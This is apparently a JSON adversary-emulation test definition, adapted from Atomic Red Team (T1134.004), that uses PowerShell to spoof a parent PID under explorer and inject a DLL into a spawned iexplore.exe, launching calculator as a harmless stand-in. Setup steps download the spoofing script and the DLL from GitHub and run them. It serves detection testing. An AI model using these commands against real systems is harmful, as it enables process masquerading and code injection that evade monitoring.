@@ -1,0 +1,182 @@
+{
+  "id": "069258f4-2162-46e9-9a25-c9c6c56150d2",
+  "name": "Parent PID Spoofing using PowerShell",
+  "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "2be7cb4b-4c85-46f6-acf4-185f035eb85a",
+      "type": "execute-command",
+      "data": {
+        "command": ". \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "069c4e4d-41a0-4728-a7b4-96c2f9336d89",
+      "type": "execute-command",
+      "data": {
+        "command": "Stop-Process -Name \"#{dll_process_name}\" -ErrorAction Ignore\nStop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "051975de-6208-4013-9a3c-b5c9a5679c10",
+      "name": "Check dependency 1/2",
+      "description": "DLL to inject must exist on disk at specified location (#{dll_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "84ac8a5c-5a01-41e1-881b-01b9281ae120",
+      "name": "Resolve dependency 1/2",
+      "description": "DLL to inject must exist on disk at specified location (#{dll_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll\" -OutFile \"#{dll_path}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6de8ee82-eff6-478e-b15e-233333289968",
+      "name": "Re-check dependency 1/2",
+      "description": "DLL to inject must exist on disk at specified location (#{dll_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fe08db79-dbbc-442e-9821-62cbad1d491a",
+      "name": "Check dependency 2/2",
+      "description": "PPID.ps1 must exist on disk at $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e0dc3619-25b8-429a-8f2d-62a009da20a1",
+      "name": "Resolve dependency 2/2",
+      "description": "PPID.ps1 must exist on disk at $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1\" -OutFile \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "266483af-6165-42b5-9009-7ef65355b3d6",
+      "name": "Re-check dependency 2/2",
+      "description": "PPID.ps1 must exist on disk at $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "2be7cb4b-4c85-46f6-acf4-185f035eb85a",
+      "p": "on-success",
+      "o": "069c4e4d-41a0-4728-a7b4-96c2f9336d89"
+    },
+    {
+      "s": "2be7cb4b-4c85-46f6-acf4-185f035eb85a",
+      "p": "on-failure",
+      "o": "069c4e4d-41a0-4728-a7b4-96c2f9336d89"
+    },
+    {
+      "s": "051975de-6208-4013-9a3c-b5c9a5679c10",
+      "p": "on-success",
+      "o": "2be7cb4b-4c85-46f6-acf4-185f035eb85a"
+    },
+    {
+      "s": "051975de-6208-4013-9a3c-b5c9a5679c10",
+      "p": "on-failure",
+      "o": "84ac8a5c-5a01-41e1-881b-01b9281ae120"
+    },
+    {
+      "s": "84ac8a5c-5a01-41e1-881b-01b9281ae120",
+      "p": "on-success",
+      "o": "6de8ee82-eff6-478e-b15e-233333289968"
+    },
+    {
+      "s": "6de8ee82-eff6-478e-b15e-233333289968",
+      "p": "on-failure",
+      "o": "2be7cb4b-4c85-46f6-acf4-185f035eb85a"
+    },
+    {
+      "s": "fe08db79-dbbc-442e-9821-62cbad1d491a",
+      "p": "on-success",
+      "o": "2be7cb4b-4c85-46f6-acf4-185f035eb85a"
+    },
+    {
+      "s": "fe08db79-dbbc-442e-9821-62cbad1d491a",
+      "p": "on-failure",
+      "o": "e0dc3619-25b8-429a-8f2d-62a009da20a1"
+    },
+    {
+      "s": "e0dc3619-25b8-429a-8f2d-62a009da20a1",
+      "p": "on-success",
+      "o": "266483af-6165-42b5-9009-7ef65355b3d6"
+    },
+    {
+      "s": "266483af-6165-42b5-9009-7ef65355b3d6",
+      "p": "on-failure",
+      "o": "2be7cb4b-4c85-46f6-acf4-185f035eb85a"
+    }
+  ],
+  "tags": [
+    "T1134.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "parent_process_name",
+      "type": "string",
+      "description": "Name of the parent process",
+      "value": "explorer"
+    },
+    {
+      "name": "spawnto_process_path",
+      "type": "path",
+      "description": "Path of the process to spawn",
+      "value": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+    },
+    {
+      "name": "dll_process_name",
+      "type": "string",
+      "description": "Name of the created process from the injected dll",
+      "value": "calculator"
+    },
+    {
+      "name": "dll_path",
+      "type": "path",
+      "description": "Path of the dll to inject",
+      "value": "PathToAtomicsFolder\\T1134.004\\bin\\calc.dll"
+    },
+    {
+      "name": "spawnto_process_name",
+      "type": "string",
+      "description": "Name of the process to spawn",
+      "value": "iexplore"
+    }
+  ]
+}
